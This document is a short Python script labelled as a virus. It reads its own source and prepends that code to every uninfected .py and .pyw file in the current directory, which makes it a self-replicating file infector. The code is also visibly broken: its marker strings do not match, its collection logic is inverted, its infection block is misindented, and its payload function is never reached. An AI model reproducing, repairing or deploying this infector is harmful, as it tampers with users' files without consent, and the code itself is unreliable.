#VIRUS SAY HI!
import sys
import glob

virus_code= []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAY HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAY BYE\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

for line in file_code:
    if line.strip() == "# VIRUS SAY HI!":
         infected = True
         break
        
if not infected:
    final_code = []
    final_code.extend(virus_code)
    final_code.append('\n')
    final_code.extend(file_code) 

    with open(file, 'w') as f:
        f.writelines(final_code)

def malicious_function():
    print("This is a malicious code. Be careful!") 

    malicious_function()
# VIRUS SAY BYE